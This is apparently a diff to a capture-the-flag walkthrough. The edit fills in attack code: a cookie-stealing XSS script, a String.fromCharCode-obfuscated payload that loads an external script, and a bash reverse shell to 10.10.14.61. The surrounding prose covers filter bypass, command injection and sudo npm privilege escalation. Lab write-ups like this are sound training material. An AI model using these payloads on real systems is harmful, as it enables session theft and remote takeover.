@@ -192,12 +192,12 @@ Now the filtering rules have removed the single quotation marks inside our scrip
 
 The way we want to do this is to force script tags which connect to an external custom script onto the HTML of this webpage, this external custom script should force the admin to make a POST request to our netcat listener so we can extract the session data.  Below shows a simple javascript that waits for the page to load then sends the request with the cookie to our IP using the port netcat will listen on, remember to change it to your IP if using it.
 
-``
+```
 window.addEventListener('DOMContentLoaded', function(e) 
 {
     window.location = "http://10.10.14.61:4444/?cookie=" + document.getElementsByName("cookie")[0].value
 })
-``
+```
 
 A method for getting our custom externally hosted script to execute on the webpage is to use the ``document.write('<script src="http://10.10.14.61/session.js"></script>');`` javascript function with a string that calls our hosted script, but we have already determined that the string format is broken by the filtering rules. We can bypass this however by using two handy javascript functions. 
 
@@ -213,6 +213,9 @@ Now we can use these character codes in our script payload which we can execute 
 
 Then we start our netcat listener to listen on the port we scripted the data to be posted to before pasting our XSS input into the notes field using the filtering bypass we just discovered.
 
+```
+<img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,51,48,47,48,120,100,102,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>"/>
+```
 [note_payload]
 
 Now it’s a case of waiting and watching our netcat listener for our session data. If everything works correctly the session cookie data should be sent to the output of our netcat listener as shown below.
@@ -254,11 +257,13 @@ We modify the request in burp to replace ‘bookings’ with ‘users%26id’, �
 
 [cat_users_id]
 
-Our command injection is working, lets use this to download a reverse TCP shell onto the system and then execute it. We can do this by hosting a bash script that starts a reverse TCP shell connecting back to our listener, the code below is the simple bash script that will be downloaded onto the target.
+Our command injection is working, lets use this to download a reverse TCP shell onto the system and then execute it. We can do this by hosting a bash script that starts a reverse TCP shell connecting back to our listener, the code below is the simple bash script that will be downloaded onto the target (remember to change it for your IP).
 
-``
-bash script
-``
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.61/4445 0>&1
+```
 
 We can host this using python the same way we hosted our javascript file. The target needs to download this bash script via our IP, but IP addresses violate the filtering rules. Luckily, we can use the decimal value of our IP address, since an IP address is just a long integer that we split with periods at every 8-bit for human readability. The online tool found at https://www.browserling.com/tools/ip-to-dec can easily convert our IP address into it’s decimal value.
 
@@ -290,9 +295,9 @@ The vulnerability with having the ‘npm i’ listed as NOPASSWD stems from it�
 
 First we shall create a JSON package in the expected format by using ``npm init`` as we only need sudo to use the ``npm -i`` feature, this will create an empty ‘package.json’ file for us. Since this is a simple shell with no job control it will be challenging to edit this file on our target. Instead we can manually copy the cat package.json output and paste it into a text editor on our attacking machine. Then we can add the command we want executed to our JSON file like shown below.
 
-``
+```
 vulnerable json
-``
+```
 
 Now, let’s host our modified malicious ‘package.json’ file along with a copy of our original reverse shell bash script with a different port on our python server. Once our new files are hosted we can go back to the user shell and download both the new shell (which I named ‘rootshell’) and our malicious ‘package.json’ to a temporary directory using wget.
 
